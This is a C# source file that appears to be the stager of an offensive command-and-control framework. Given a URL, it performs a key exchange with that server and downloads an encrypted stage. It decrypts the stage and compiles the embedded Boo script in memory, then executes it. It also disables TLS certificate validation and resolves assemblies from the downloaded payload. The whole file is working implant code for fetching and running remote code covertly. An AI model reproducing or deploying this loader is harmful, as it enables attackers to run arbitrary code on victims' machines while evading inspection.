using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;
using Boo.Lang.Compiler;
using Boo.Lang.Compiler.IO;
using Boo.Lang.Compiler.Pipelines;

namespace Naga
{
    public class ST
    {
        static Guid GUID = Guid.NewGuid();
        static Uri URL = null;
        static Uri BASE_URL = null;
        private static ZipStorer _stage = null;

        static ST()
        {
            ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)768 | (SecurityProtocolType)3072;
            ServicePointManager.Expect100Continue = false;
            AppDomain.CurrentDomain.AssemblyResolve += ResolveEventHandler;
        }

        private static Assembly ResolveEventHandler(object sender, ResolveEventArgs args)
        {
            var dllName = Utils.GetDllName(args.Name);
    #if DEBUG
            Console.WriteLine("\t[-] '{0}' was required...", dllName);
    #endif
            byte[] bytes;
            try
            {
                bytes = Utils.GetResourceByName(dllName);
            }
            catch
            {
                bytes = Utils.GetResourceFromZip(_stage, dllName) ??
                        File.ReadAllBytes(RuntimeEnvironment.GetRuntimeDirectory() +
                                          dllName);
            }
    #if DEBUG
            Console.WriteLine("\t[+] '{0}' loaded...", dllName);
    #endif
            return Assembly.Load(bytes);
        }

        public static void Main(string[] args)
        {
            if (args.Length != 1)
            {
                Console.WriteLine("Usage: ST.exe <URL>");
                Environment.Exit(1);
            }

            try
            {
                BASE_URL = new Uri(args[0]);
                URL = new Uri(new Uri(args[0]), GUID.ToString());
            }
            catch
            {
                Console.WriteLine("Invalid URL?");
                Environment.Exit(1);
            }

            //AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(ResolveEventHandler);

#if DEBUG
            Console.WriteLine("[+] URL: {0}", URL);
#endif

            byte[] key = Crypto.ECDHKeyExchange(URL);
            byte[] encrypted_zip = Comms.HttpGet(URL);
            _stage = ZipStorer.Open(new MemoryStream(Crypto.Decrypt(key, encrypted_zip)), FileAccess.ReadWrite, true);

            byte[] resource = Utils.GetResourceFromZip(_stage, "Main.boo");
            string source = Encoding.UTF8.GetString(resource, 0, resource.Length);

            RunBooEngine(source);

        }

        public static void RunBooEngine(string source)
        {
            Console.WriteLine("\n[*] Compiling Stage Code");

            BooCompiler compiler = new BooCompiler();
            compiler.Parameters.Input.Add(new StringInput("Stage.boo", source));
            compiler.Parameters.Pipeline = new CompileToMemory();
            compiler.Parameters.Ducky = true;
            compiler.Parameters.References.Add(compiler.Parameters.LoadAssembly("System.Web.Extensions", true));
            //Console.WriteLine(compiler.Parameters.LibPaths);
            //compiler.Parameters.LoadAssembly("System");

            CompilerContext context = compiler.Run();
            //Note that the following code might throw an error if the Boo script had bugs.
            //Poke context.Errors to make sure.
            if (context.GeneratedAssembly != null)
            {
                Console.WriteLine("[+] Compilation Successful!");
                Console.WriteLine("[*] Executing");

                //AppDomain.CurrentDomain.AssemblyResolve -= ResolveEventHandler;
                context.GeneratedAssembly.EntryPoint.Invoke(null, new object[] { new string[] { GUID.ToString(), BASE_URL.ToString() } });
            }
            else
            {
                Console.WriteLine("[-] Error(s) compiling script, this probably means your Boo script has bugs\n");
                foreach (CompilerError error in context.Errors)
                    Console.WriteLine(error);
            }
        }
    }
}